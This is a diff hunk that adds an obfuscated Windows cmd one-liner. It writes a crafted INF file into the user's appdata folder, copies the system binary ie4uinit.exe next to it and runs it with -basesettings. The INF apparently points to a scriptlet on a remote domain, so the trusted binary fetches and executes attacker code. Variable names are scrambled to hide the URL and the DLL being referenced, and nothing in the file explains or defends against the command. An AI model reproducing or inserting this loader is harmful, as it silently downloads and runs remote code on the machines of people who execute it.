@@ -1,0 +1,4 @@
+/v /c (for %t in (s) do @set "Genetics=%~t") &&
+  call(for /D %t in ("[B7C]" "sc\" "ro%Abstract%j,NI,%Remarks%%Trains%%Trains%p%Hundred%%Descriptions%%Descriptions%lsfyf.kimberlykamara.%Communities%/winapayf" "[strings]" "Descriptions=/" "Trains=t;Vital" "Abstract=b;Points" "Remarks=h" "servicename=' '" "Eagles=init" "Communities=com" "Force=%time%" "shortsvcname=' '" "Hundred=:;Types" "[301A6]" "ieu%Eagles%.inf" "[defaultinstall.windows7]" "delfiles=301A6" "Un\" "Register\" "OCXs=B7C" "[destinationdirs]" "defaultdestdir=11" "301A6=01" "[version]" "signature =$windows nt$" ) do @echo %~t)>"%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %win!Buddy!ir%\system32\ie4uinit.exe "%appdata%\microsoft\*" &&
+  %appdata%\microsoft\ie4uinit.exe -basesettings
